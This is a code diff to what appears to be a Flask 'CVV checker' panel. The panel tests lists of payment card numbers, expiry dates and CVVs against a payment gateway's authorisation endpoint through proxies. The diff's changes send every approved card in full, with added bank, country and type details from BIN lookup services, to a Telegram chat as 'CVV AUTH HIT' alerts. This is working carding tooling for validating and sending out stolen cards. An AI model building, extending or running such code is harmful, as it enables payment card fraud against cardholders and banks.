@@ -82,17 +82,38 @@ def save_db(data):
     with open(DB_FILE, 'w', encoding='utf-8') as f:
         json.dump(data, f, indent=4)
 
-def save_live_card(card_line, detail):
+def save_live_card(card_line, detail, bin_info=None):
     try:
         with open(LIVE_FILE, "a", encoding="utf-8") as f:
             f.write(f"{card_line} | {detail}\n")
         
-        # Send Live/Approved hits to the Telegram config specified in checker panel
         cfg = load_config()
         live_token = cfg.get("live_tg_token", "").strip()
         live_chat = cfg.get("live_tg_chat", "").strip()
         if live_token and live_chat:
-            send_telegram_alert(live_token, live_chat, f"<b>⚡ KYU CVV HIT! ⚡</b>\n<code>{card_line}</code>\n💬 <i>{detail}</i>")
+            parts = card_line.split("|")
+            cc = parts[0].strip() if len(parts) > 0 else ""
+            mo = parts[1].strip() if len(parts) > 1 else ""
+            yr = parts[2].strip() if len(parts) > 2 else ""
+            cvv = parts[3].strip() if len(parts) > 3 else ""
+            date_str = f"{mo}/{yr}"
+
+            scheme = bin_info.get("scheme", "VISA/MC") if bin_info else "VISA/MC"
+            card_type = bin_info.get("type", "CREDIT") if bin_info else "CREDIT"
+            bank = bin_info.get("bank", "Unknown Bank") if bin_info else "Unknown Bank"
+            country = bin_info.get("country", "Unknown") if bin_info else "Unknown"
+
+            tg_msg = (
+                f"<b>🔥 CVV AUTH HIT 🔥</b>\n\n"
+                f"💳 <b>Card:</b> <code>{card_line}</code>\n"
+                f"🌐 <b>Gateway:</b> Littlepay (Auth)\n"
+                f"💬 <b>Response:</b> {detail}\n"
+                f"🏷️ <b>Type:</b> {scheme} - {card_type}\n"
+                f"📅 <b>Date:</b> {date_str}\n"
+                f"🏛️ <b>Bank:</b> {bank}\n"
+                f"🌍 <b>Country:</b> {country}"
+            )
+            send_telegram_alert(live_token, live_chat, tg_msg)
     except Exception:
         pass
 
@@ -148,36 +169,45 @@ def handle_config():
 @app.route('/api/bin/<bin_code>')
 def api_bin_lookup(bin_code):
     bin_code = bin_code.strip()[:6]
+    
+    # Primary Source: bincheck.io
     try:
         r = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=5)
         if r.status_code == 200:
             data = r.json()
             if data and data.get("success"):
-                return jsonify({
-                    "success": True,
-                    "scheme": (data.get("scheme") or "UNKNOWN").upper(),
-                    "type": (data.get("type") or "").upper(),
-                    "country": f"{data.get('country', {}).get('emoji', '')} {data.get('country', {}).get('name', 'Unknown')}",
-                    "bank": data.get("bank", {}).get("name", "Unknown Bank")
-                })
+                bank_name = data.get("bank", {}).get("name")
+                country_name = data.get('country', {}).get('name')
+                if bank_name and country_name:
+                    return jsonify({
+                        "success": True,
+                        "scheme": (data.get("scheme") or "UNKNOWN").upper(),
+                        "type": (data.get("type") or "").upper(),
+                        "country": f"{data.get('country', {}).get('emoji', '')} {country_name}",
+                        "bank": bank_name
+                    })
     except Exception:
         pass
 
+    # Secondary Source: binlist.net
     try:
         r2 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=5)
         if r2.status_code == 200:
             data2 = r2.json()
-            return jsonify({
-                "success": True,
-                "scheme": (data2.get("scheme") or "UNKNOWN").upper(),
-                "type": (data2.get("type") or "").upper(),
-                "country": f"{data2.get('country', {}).get('emoji', '')} {data2.get('country', {}).get('name', 'Unknown')}",
-                "bank": data2.get("bank", {}).get("name", "Unknown Bank")
-            })
+            bank_info = data2.get("bank", {})
+            country_info = data2.get("country", {})
+            if bank_info.get("name") and country_info.get("name"):
+                return jsonify({
+                    "success": True,
+                    "scheme": (data2.get("scheme") or "UNKNOWN").upper(),
+                    "type": (data2.get("type") or "").upper(),
+                    "country": f"{country_info.get('emoji', '')} {country_info.get('name', 'Unknown')}",
+                    "bank": bank_info.get("name", "Unknown Bank")
+                })
     except Exception:
         pass
 
-    return jsonify({"success": False, "scheme": "VISA/MC", "type": "", "country": "Unknown", "bank": "Unknown Bank"})
+    return jsonify({"success": False, "scheme": "VISA/MC", "type": "CREDIT", "country": "🌐 Unknown Country", "bank": "🏦 Unknown Bank"})
 
 @app.route('/api/keys', methods=['GET', 'POST'])
 def handle_keys():
@@ -569,7 +599,22 @@ def background_worker(cards, proxies_list, max_threads):
             counts["checked"] += 1
             if code == 0:
                 counts["live"] += 1
-                save_live_card(card, detail)
+                # Quick server-side BIN lookup for Telegram alert formatting
+                bin_code = card.split("|")[0].strip()[:6]
+                bin_meta = {}
+                try:
+                    b_res = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=3).json()
+                    if b_res and b_res.get("success"):
+                        bin_meta = {
+                            "scheme": (b_res.get("scheme") or "VISA/MC").upper(),
+                            "type": (b_res.get("type") or "CREDIT").upper(),
+                            "bank": b_res.get("bank", {}).get("name", "Unknown Bank"),
+                            "country": f"{b_res.get('country', {}).get('emoji', '')} {b_res.get('country', {}).get('name', 'Unknown')}"
+                        }
+                except Exception:
+                    pass
+                save_live_card(card, detail, bin_meta)
+
             elif code == 1:
                 counts["dead"] += 1
             else:
